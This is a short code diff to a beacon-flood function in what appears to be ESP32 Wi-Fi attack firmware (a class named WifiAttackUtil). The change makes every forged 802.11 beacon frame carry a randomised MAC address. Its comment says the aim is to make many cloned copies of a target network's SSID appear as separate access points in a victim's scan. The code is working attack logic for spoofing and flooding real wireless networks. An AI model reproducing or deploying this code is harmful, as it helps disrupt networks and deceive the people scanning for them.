@@ -120,6 +120,16 @@ esp_err_t WifiAttackUtil::beaconFlood(const uint8_t* bssid, const char* ssid, co
 
   const size_t ssidLen = strnlen(ssid, 32);
 
+  // Flood = many visible copies of the TARGET SSID. Each beacon must carry its
+  // own BSSID, otherwise (reusing the real AP's BSSID) every frame just merges
+  // into the existing network and no new AP ever appears in the victim's scan.
+  // Randomise a locally-administered unicast MAC per call (the passed `bssid` is
+  // only the scan match — its SSID/channel are what we clone).
+  (void)bssid;
+  uint8_t mac[6];
+  for (int j = 0; j < 6; j++) mac[j] = (uint8_t)random(0, 256);
+  mac[0] = (mac[0] & 0xFE) | 0x02;
+
   uint8_t pkt[109];
   size_t  n = 0;
 
@@ -127,8 +137,8 @@ esp_err_t WifiAttackUtil::beaconFlood(const uint8_t* bssid, const char* ssid, co
   pkt[n++] = 0x00; pkt[n++] = 0x00;
   pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;
   pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;
-  memcpy(&pkt[n], bssid, 6); n += 6;
-  memcpy(&pkt[n], bssid, 6); n += 6;
+  memcpy(&pkt[n], mac, 6); n += 6;
+  memcpy(&pkt[n], mac, 6); n += 6;
   const size_t seqOff = n;
   pkt[n++] = 0x00; pkt[n++] = 0x00;
 
